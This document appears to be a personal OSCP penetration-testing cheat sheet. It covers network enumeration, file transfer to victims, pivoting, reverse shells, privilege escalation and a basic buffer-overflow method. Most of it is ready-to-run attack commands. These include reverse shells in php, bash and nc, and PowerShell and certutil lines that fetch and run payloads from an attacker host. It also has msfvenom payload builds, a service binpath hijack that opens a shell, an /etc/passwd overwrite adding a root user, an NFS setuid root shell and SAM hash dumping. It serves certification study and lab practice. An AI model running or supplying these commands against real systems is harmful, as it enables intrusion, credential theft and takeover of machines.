# Hacking-OSCP_cheatsheet
OSCP_cheatsheet

Enumeration
Network discoverie
Nmap

I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:

nmap -sV -O --top-ports 50 --open -oA nmap/initial <ip or cidr>
nmap -sC -sV -O --open -p- -oA nmap/full <ip or cidr>
nmap -sU -p- -oA nmap/udp <ip or cidr>

--top-ports only scan the N most common ports
--open only show open ports
-sC use the default scripts
-sV detect versions
-O detect Operating Systems
-p- scan all the ports
-oA save the output in normal format, grepable and xml
-sU scan UDP ports

Is also possible to specify scripts or ports:

nmap --scripts vuln,safe,discovery -p 443,80 <ip or cidr>

If there are servers that could be not answering (ping), then add the flag -Pn (example of initial one):

nmap -Pn --top-ports 50 --open -oA nmap/initial <ip or cidr>

Ports discovery (without nmap)
nc + bash

If you get in a machine that doesn’t have nmap installed, you can do a basic discovery of (for example), top 10 ports open in 192.168.30 by doing:

top10=(20 21 22 23 25 80 110 139 443 445 3389); for i in "${top10[@]}"; do nc -w 1 192.168.30.253 $i && echo "Port $i is open" || echo "Port $i is closed or filtered"; done

/dev/tcp/ip/port or /dev/udp/ip/port

Alternatively, is possible to do the same than above but by using the special dev files /dev/tcp/ip/port or /dev/udp/ip/port (for example nc is not found):

top10=(20 21 22 23 25 80 110 139 443 445 3389); for i in "${top10[@]}"; do (echo > /dev/tcp/192.168.30.253/"$i") > /dev/null 2>&1 && echo "Port $i is open" || echo "Port $i is closed"; done

Taking these last examples, is straightforward to create a dummy script for scan a hole /24 net (for example):

#!/bin/bash
subnet="192.168.30"
top10=(20 21 22 23 25 80 110 139 443 445 3389)
for host in {1..255}; do
    for port in "${top10[@]}"; do
        (echo > /dev/tcp/"${subnet}.${host}/${port}") > /dev/null 2>&1 && echo "Host ${subnet}.${host} has ${port} open" || echo "Host ${subnet}.${host} has ${port} closed"
    done
done

Banner grabbing (without nmap)

If nmap didn’t grab banners (or is not installed), you can do it with /dev/tcp/ip/port /dev/udp/ip/port or by using telnet.
/dev/tcp/ip/port or /dev/udp/ip/port

cat < /dev/tcp/192.168.30.253/22
SSH-2.0-OpenSSH_6.2p2 Debian-6
^C pressed here

For doing it with udp ports is the same, but changing tcp for udp
telnet

telnet 192.168.30.253 22
SSH-2.0-OpenSSH_6.2p2 Debian-6
^C pressed here

Web directorie/file scanner
Gobuster

Scan all the directories/files by extension:

gobuster dir -u http://192.168.24.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o webscan/gobuster-extensions

For scanning without extensions, just take out the -x
Nikto

Sometimes Nikto shows juicy information, I tend to run it like:

nikto -Format txt -o webscan/nikto-initial -host http://192.168.24.24 -p 8080

fuff

Web fuzzer, you can get fuff here, it basically bruteforces the dirs.

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.24.24/FUZZ

Most usefull dictionaries (OSCP/HTB)

/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/wfuzz/others/common_pass.txt

In seclists-pkg:

/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
/usr/share/seclists/Passwords/Leaked-Databases/alleged-gmail-passwords.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

Samba
smbclient

Check if there is anonymous login enabled:

smbclient -L 192.168.24.24

impacket

Is also possible to use impacket in the same way than smbclient to check for anonymous login (and a lot more as browse the shares) in case of incompatible versions.


/usr/share/doc/python3-impacket/examples/smbclient.py ""@192.168.24.24

smbmap

Check which permissions we have in those shares (if there are):

smbmap -H 192.168.24.24
Or having an user:
smbmap -u ceso -H 192.168.24.24

Version (nmap didn’t detect it)

Sometimes nmap doesn’t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.
Exfiltration
Samba

Generate a samba server with Impacket:

impacket-smbserver tools /home/kali/tools

Mount in Windows

Mounting it in Windows with Powershell:

New-PSDrive -Name "tools" -PSProvider "Filesystem" -Root "\\192.168.42.42\tools"

Mounting it without Powershell:

net use z: \\192.168.42.42\tools"

On windows, to list mounted shares, either Powershell or without it:

Powershell: Get-SMBShare
Without Powershell: net share

Mount in Linux

Is needed to have installed cifs-utils, to install it (in debian based):

sudo apt-get install cifs-utils

To mount it:

sudo mount -t cifs //192.168.42.42/tools ~/my_share/

To list mounted shares:

mount | grep cifs
grep cifs /proc/mount

HTTP

From your local attacker machine, create a http server with:

sudo python3 -m http.server 80
sudo python2 -m SimpleHTTPServer 80

It’s also possible to specify which path to share, for example:

sudo python3 -m http.server 80 --dir /home/kali/tools

Windows

iex(new-object net.webclient).downloadstring("http://192.168.42.42/evil.ps1)
certutil.exe -urlcache -split -f "http://192.168.42.42/nc.exe" nc.exe
IWR -Uri "http://192.168.42.42/n64.exe" -Outfile "n64.exe"

Linux

curl http://192.168.42.42/evil.php --output evil.php

FTP

If there is an ftp server which we have access, we can upload files there through it, the "" is the same for both, windows or linux:

Connect and login with:

ftp 192.168.42.42

Upload the files with:

put evil.py

Sometimes is needed to enter in passive mode before doing anything, if is the case, just type:

pass

followed by enter

Sockets

Using nc/ncat is possible to create as a listener to upload/download stuff through them, the syntax for nc and ncat is basically the same. Create the socket with:

Attacker:
  nc -lvnp 443 < evil.php

For both cases from windows, the only difference is to write nc.exe

Victim:
  nc -v 192.168.42.42 443 > evil.php

RDP

If we have access to a windows machine with a valid user/credentials and this user is in the “Remote Desktop Users”, we can share a local directorie as a mount volume through rdp itself once we connect to the machine:

rdesktop -g 1600x800 -r disk:tmp=/usr/share/windows-binaries 192.168.30.30 -u pelota -p -

Pivoting

It’s possible to do pivoting by using proxychains, pure nc’s or in case of linux just some fifo files (I will write them down this another methods down maybe in a future), I have used during all the OSCP an awesome tool called (sshuttle)[https://github.com/sshuttle/sshuttle] (it’s a transparent proxy server that works like “a vpn”, and doesn’t require with super rights, only thing needed is that the bastion server you will use, needs to have installed python) and sometimes some SSH Forwarding. Something worth to mention nmap doesn’t work through sshuttle.
sshuttle
One hop

Let’s say we are in an intranet and we have compromised a firewall that gives us access to the management net (fw.example.mgmt - ips 192.168.20.35 and 192.168.30.253 as the management ip), by using sshuttle we can create a “vpn” to talk directly to those servers, for that, we use:

sshuttle ceso@192.168.20.35 192.168.30.0/24

Multi-hops

Now imagine that after we broke up into the management net after some some enumeration, we ended to compromise a machine that has also access to a production environment (foreman.example.mgmt - ips 192.168.30.40 and 192.168.25.87), we can take advantage of sshuttle + ProxyCommand of ssh to create a “vpn” through this multiple hops, so…putting it down, this will be kind of as follow (the diagram is extremly simplified and just for the sake of illustrate this visually, so it doesn’t intend to provide a 100% precise network diagram):

To have that working, is needed to put the next conf in your ssh conf file (normally ~/.ssh/config. It’s based on the example above, but is easy to extrapolate to different scenarios):

Host fw.example.mgmt
  Hostname 192.168.20.35
  User userOnFw
  IdentityFile ~/.ssh/priv_key_fw
Host foreman.example.mgmt
  Hostname 192.168.30.40
  User root
  ProxyJump fw.example.mgmt
  IdentityFile ~/.ssh/priv_key_internal

And now to setup the “multiple hop vpn”, run:

sshuttle -r foreman.example.mgmt -v 192.168.25.0/24 &

Later on is possible to connect from the local machine:
ssh foo@192.168.25.74

Reverse shells
php

<?php $sock = fsockopen("192.168.42.42","443"); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

php -r '$sock=fsockopen("192.168.42.42",443);exec("/bin/sh -i <&3 >&3 2>&3");'

bash

bash -i >& /dev/tcp/192.168.42.42/443 0>&1

sh + nc

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.42.42 443 >/tmp/f

Perl (example deploy as cgi-bin)

msfvenom -p cmd/unix/reverse_perl LHOST="192.168.42.42" LPORT=443 -f raw -o reverse_shell.cgi

Java (example to deploy on tomcat)

msfvenom -p java/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f war  rev_shell.war

Windows HTPP download reverse shell

msfvenom -a x86 --platform windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://192.168.42.42/Invoke-PowerShellTcp.ps1')\"" -e x86/unicode_mixed BufferRegister=EAX -f python

Windows staged reverse TCP

 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe

Windows stageless reverse TCP

msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.42.42 LPORT=443 -f exe -o <output_name.format>

Linux staged reverse TCP

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o <outout_name>.elf

Linux staged reverse TCP

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o <outout_name>.elf

Privilege escalation
Windows
Run-As

PS C:\> $secstr = New-Object -TypeName System.Security.SecureString
PS C:\> $username = "<domain>\<user>"
PS C:\> $password = '<password>'
PS C:\> $secstr = New-Object -TypeName System.Security.SecureString
PS C:\> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
PS C:\> Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<ip/host>:<port>/path/to/file.evil') } -Credential $cred -Computer localhost
-----------------------------------------------------------------------------------------------------
Invoke-Command -ComputerName localhost -Creadential $credential -ScriptBlock { C:\inetpub\wwwroot\internal-01\log\nc.exe 10.10.14.4 1338 -e cmd.exe }

Incorrect permisions in services (sc config binpath)

Binpath is set as running cmd.exe passing a commad to execute to it (so once the process dies, the one executed by it so the command to cmd.exe remains):

sc config upnphost binpath= "C:\WINDOWS\System32\cmd.exe /k C:\inetpub\wwwroot\nc.exe -nv 192.168.42.42 443 -e C:\WINDOWS\System32\cmd.exe" 

SAM + SYSTEM + Security

If those 3 files are in your hands (you could download to your attacker machine), you can dump hashes and crack them:

/usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM.bak -security SECURITY.bak -system SYSTEM.bak LOCAL

sudo john dumped_hashes --format=NT --wordlist=/usr/share/wordlists/rockyou.txt

Linux
/home/user/openssl =ep (empty capabilities)

Make 2 copies of passwd, one as backup of the original, and one that will be used as custom:

cp /etc/passwd /tmp/passwd.orig
cp /etc/passwd /tmp/passwd.custom

Now, a custom user will be created and added to /tmp/passwd.custom with customPassword and as root user (UID = GID = 0):

echo 'ceso:'"$( openssl passwd -6 -salt xyz customPassword )"':0:0::/tmp:/bin/bash' >> /tmp/passwd.custom

Now, create a custom key.pem and cert.pem with openssl:

openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

Encrypt the new custom passwd:

openssl smime -encrypt -aes256 -in /tmp/passwd.custom -binary -outform DER -out /tmp/passwd.enc /tmp/cert.pem

Now, decrypt the custom passwd overwritting in the process the real one (/etc/passwd):

cd /
/home/ldapuser1/openssl smime -decrypt -in /tmp/passwd.enc -inform DER -inkey /tmp/key.pem -out /etc/passwd

And finally, just login with the user created with root privileges by using customPassword:

su - ceso

Command web injection: add user

/usr/sbin/useradd c350 -u 4242 -g root -m -d /home/c350 -s /bin/bash -p $(echo pelota123 | /usr/bin/openssl passwd -1 -stdin) ; sed 's/:4242:0:/:0:0:/' /etc/passwd -i 

NFS; no_root_squash,insecure,rw

If /etc/exports has a line like:

/srv/pelota 192.168.42.0/24(insecure,rw)
/srv/pelota 127.0.0.1/32(no_root_squash,insecure,rw)

NFS is being exported and you and you have ssh access to the machine. From your attacker machine while logged as root user run:

ssh -f -N megumin@192.168.42.43 -L 2049:127.0.0.1:2049
mount -t nfs 127.0.0.1:/srv/pelota my_share
cd my_share
cat > shell.c<<EOF
#include <unistd.h>
int main(){
  setuid(0);
  setgid(0);
  system("/bin/bash");
}
EOF
gcc shell.c -o shell
chmod u+s shell

Now from inside a SSH session on the victim machine (in this example 192.168.42.32):

bash-4.2$ cd /srv/pelota
bash-4.2$ ./shell
bash-4.2# id
uid=0(root) gid=0(root) groups=0(root),1000(megumin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

Good to know (either Windows and/or Linux)
Arch cross compile exploit (and diff glibc version)

gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c

IP restriction at application level, bypass

Try to send a request modifying the HTTP header by adding:

X-Forwarder-For: <ip allowed>

Windows - check OS information

systeminfo
ver

Windows - check architecture

wmic os get osarchitecture
echo %PROCESSOR_ARCHITECTURE%

Powershell running as 32 or 64 bits

[Environment]::Is64BitProcess   

Linux LFI - intesresting files to look after

/proc/self/status
/proc/self/environ
/etc/passwd
/etc/hosts
/etc/exports

Simple Buffer Overflow (32 bits, NO ASLR and NO DEP)
Summarized steps

    0 - Crash the application
    1 - Fuzzing (find aprox number of bytes where the crash took place)
    2 - Find offset
    3 - EIP control
    4 - Check for enough space on buffer
    5 - Badchars counting
    6 - Find return address (JMP ESP)
    7 - Create payload

Fuzzing: example with vulnserver + spike on TRUN command

cat > trun.spk <<EOF
s_readline();
s_string("TRUN ");
s_string_variable("COMMAND");
EOF

Now, start wireshark filtering on the target IP/PORT below and run the trun.spk:

generic_send_tcp 172.16.42.131 9999 trun.spk 0 0

Once a crash takes place, go to wireshark to locate the crash.
Badchars

From the block below, the next ones were not included (most common badchars):

\x00 --> null byte
\x0a --> new line character (AKA "\n")

So…actual list of badchars:

\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

Usefull tools (on Kali Linux)
create_pattern

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
/usr/bin/msf-pattern_create

pattern_offset

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
/usr/bin/msf-pattern_offset

nasm_shell

/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
/usr/bin/msf-nasm_shell

msfvenom

/usr/share/metasploit-framework/msfvenom
/usr/bin/msfvenom

Shellcode POC: calc.exe

msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name buffer CMD=calc.exe EXITFUNC=thread
